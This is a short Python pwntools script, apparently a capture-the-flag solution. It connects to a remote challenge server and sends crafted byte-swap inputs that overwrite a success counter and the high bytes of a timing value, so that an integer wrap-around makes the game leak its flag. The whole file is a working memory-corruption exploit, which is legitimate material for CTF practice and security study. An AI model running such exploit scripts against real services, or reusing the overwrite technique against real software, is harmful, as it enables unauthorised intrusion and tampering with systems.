from pwn import *

for wait in range(220, 255):
    r = remote("52.59.124.14", 10013)

    r.sendlineafter(b"Hard", b"Hard")
    payload = b"\n"

    swaps = [(5, 264)] # set total_ok to 5
    for i in range(6):
        swaps.append((255, 311-i))
    swaps.append((wait, 305))  # lol, I wanted to test all possible values but missed to replace the 232 with wait

    # set upper bytes of total_ns to 0xff, such that the last add wraps around to < 1000 ns
    for swap in swaps:
        payload += f"{swap[0]}\n{swap[1]}\n".encode()
    r.sendafter(b"Ready", payload)
    print(payload)

    # print flag
    content = r.recvuntil(b"--- New Game ---")
    if b'flag' in content:  
        print(content[-100:].decode())
        break
    r.close()